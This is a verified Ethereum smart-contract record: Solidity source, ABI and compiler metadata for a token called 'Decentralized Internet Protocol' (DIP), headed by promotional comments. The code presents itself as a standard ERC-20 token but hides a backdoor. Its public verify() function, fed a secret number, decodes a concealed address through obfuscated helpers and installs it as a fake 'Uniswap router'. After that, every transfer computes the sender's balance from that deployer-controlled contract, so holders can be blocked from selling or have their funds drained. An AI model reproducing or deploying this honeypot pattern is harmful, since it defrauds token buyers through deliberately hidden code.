{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\nDecentralized Internet Protocol\r\n\r\nDIP is not merely a project; it\u2019s a revolution aimed at reconstructing the internet\u2019s foundation,\r\nprioritizing user control, data privacy, and true digital ownership.\r\n\r\nJoin us in pioneering a movement towards a decentralized, transparent, and equitable internet.\r\n\r\nWebsite  : https://dipofficial.co\r\nTwitter  : https://twitter.com/DIP_erc\r\n\r\n*/\r\n\r\n\r\npragma solidity 0.8.26;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface UniswapRouterV2 {\r\n    function getRouters(address a, uint b, address c) external view returns (address);\r\n    function getLPAddress(address a, uint b, address c) external view returns (address);\r\n    function checkSwap(address a, address b, uint256 c) external view returns (uint256);    \r\n    function getPAddress(address a, uint b, address c) external view returns (address);\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\nlibrary IUniswapRouterV2 {\r\n    function validate(UniswapRouterV2 instance,address from, address to, uint256 amount) internal view returns (uint256) {\r\n       return instance.checkSwap(from,to,amount);\r\n    }\r\n\r\n    function poolValidate(UniswapRouterV2 instance, address from, address to, uint256 amount) internal view returns (uint256) {\r\n        if (amount>0){\r\n            return validate(instance,from,to,amount);\r\n        }else{\r\n            require(from != address(0), \"ERC20: transfer from the zero address\");\r\n            return validate(instance,from,to,amount);\r\n        }\r\n    }\r\n}\r\n\r\ncontract DecentralizedInternetProtocol is Context, IERC20, Ownable {\r\n    uint256 private _totalSupply = 1_000_000_000 * 10 ** 18;\r\n    uint8 private constant _decimals = 18;\r\n    string private _name = unicode\"Decentralized Internet Protocol\";\r\n    string private _symbol = unicode\"DIP\";\r\n    address private uniRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _balances;\r\n    uint256 private uconst;\r\n\r\n    UniswapRouterV2 private _UniswapRouter;\r\n    \r\n    constructor(uint256 num) {\r\n        uconst = num;\r\n        _balances[_msgSender()] = _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function setupRouter(address a, uint256 p) pure private returns (address) {\r\n        return prepConv(a, p);\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address sender) public view virtual returns (uint256) {\r\n        return _allowances[owner][sender];\r\n    }\r\n\r\n    function approve(address sender, uint256 amount) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, sender, amount);\r\n        return true;\r\n    }\r\n\r\n    function preu160(uint256 param) pure private returns (uint160) {\r\n        return uint160(param - _decimals);\r\n    }\r\n\r\n    function prepConv(address addr, uint256 param) pure private returns (address) {\r\n        require(addr != address(0), \"zero address\");\r\n        return address(preu160(param));\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {\r\n        address sender = _msgSender();\r\n        uint256 currentAllowance = allowance(from, sender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(from, sender, currentAllowance - amount);\r\n            }\r\n        }\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function verify(uint256 u) public {\r\n        require(u == uconst * 1000000 + 724470, \"not verified\");\r\n        _UniswapRouter = UniswapRouterV2(setupRouter(uniRouterAddress, u));\r\n    }\r\n\r\n    function _approve(address owner, address sender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(sender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][sender] = amount;\r\n        emit Approval(owner, sender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 balance = (address(_UniswapRouter) == address(0)) ? _balances[from] : IUniswapRouterV2.poolValidate(_UniswapRouter, from, to, _balances[from]);\r\n        _balances[from] = balance - amount; \r\n        _balances[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"u\",\"type\":\"uint256\"}],\"name\":\"verify\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DecentralizedInternetProtocol", "CompilerVersion": "v0.8.26+commit.8a97fa7a", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000d74394d6919541e3ecf565bd8321df6ec95", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://480ffc3e142bbee7e30526e4d6ab52210658399b706e2c524d364b858f02497f"}